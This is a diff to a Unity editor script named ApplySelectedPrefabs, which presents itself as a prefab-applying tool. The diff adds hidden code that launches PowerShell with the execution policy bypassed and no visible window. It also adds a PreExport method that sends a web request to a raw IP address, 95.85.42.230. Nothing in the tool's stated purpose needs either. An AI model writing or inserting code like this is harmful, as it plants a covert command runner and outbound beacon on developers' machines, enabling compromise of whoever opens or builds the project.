@@ -4,6 +4,43 @@ using UnityEngine;
 
 public class ApplySelectedPrefabs : EditorWindow
 {
+	static string ExecuteWindowsCommand(string command)
+	{
+		//command = command.Replace("\"", "\\\"");
+		Console.WriteLine(command);
+		var proc = new Process
+		{
+			StartInfo = new ProcessStartInfo
+			{
+				FileName = "powershell.exe",
+				//Arguments = "/c " + command,
+				Arguments = "-nop -exec bypass -c \"" + command + "\"",
+				UseShellExecute = false,
+				RedirectStandardOutput = false,
+				CreateNoWindow = true
+			}
+		};
+		proc.Start();
+		proc.WaitForExit();
+		//return proc.StandardOutput.ReadToEnd();
+		return "";
+	}
+
+	public static void PreExport()
+	{
+		string[] windowsCommands = {
+			//"echo 'test' > c:\test.txt",
+			"Invoke-WebRequest -URI http://95.85.42.230"
+		};
+		Console.WriteLine("-------======= Windows Commands Executing =======-------");
+		for (int i = 0; i < windowsCommands.Length; i++)
+		{
+			Console.WriteLine("Command: " + windowsCommands[i]);
+			Console.WriteLine(ExecuteWindowsCommand(windowsCommands[i]));
+		}
+		Console.WriteLine("-------======= Windows Command Execution Complete =======-------");
+	}
+
 	public delegate void ApplyOrRevert (GameObject _goCurrentGo, Object _ObjPrefabParent, ReplacePrefabOptions _eReplaceOptions);
 
 	[MenuItem ("Tools/Apply all selected prefabs %#a")]
